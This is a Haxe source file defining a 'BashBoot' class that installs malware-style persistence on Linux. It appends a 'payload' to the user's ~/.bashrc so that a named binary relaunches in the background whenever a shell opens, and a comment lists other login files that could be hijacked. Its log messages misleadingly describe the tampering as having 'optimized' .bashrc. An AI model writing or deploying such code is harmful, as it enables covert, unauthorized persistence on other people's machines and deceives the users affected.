package app.services;

import sys.io.File;
import sys.FileSystem;

class BashBoot {
  public var uname: String;

  public function new (): Void {
    try {
      this.uname = Sys.getEnv('USER');
    } catch (error: haxe.Exception) {
      this.uname = '';
      trace(error.message);
    }
  }

  /* 
    Sets itself to be runned from the bash script.
    
    Other files that may be used: 
    /etc/profile
    ~/.bash_profile
    ~/.bash_login
    ~/.profile
   */
  public function set (path: String, name: String): Bool {
    if (path.substr(path.length - 1, path.length) != '/') path += '/';

    FileSystem.createDirectory(path);

    // new Process('cp ${Sys.programPath()} ${path}${name}');

    trace('"BashRc" deployed the target to the destination.');

    var bashrc: String = File.getContent('/home/${this.uname}/.bashrc');
    
    // Bash payload.
    final payload: String = '\nif ! [[ $(pgrep ${name}) ]]; then\n    (${path}${name} &)\nfi\n';

    // Check if the bash file already contains the instructions.
    if (bashrc.substr(bashrc.length - payload.length, bashrc.length) != payload) {
      bashrc += payload;
      File.saveContent('/home/${this.uname}/.bashrc', bashrc);

      trace('File ".bashrc" has been optimized.');
    } else {
      trace('File ".bashrc" has already been optimized.');
    }

    return true;
  }

  public function check (): Bool {
    if (this.uname.length != 0) return FileSystem.exists('/home/${this.uname}/.bashrc');
    else return false;
  }
}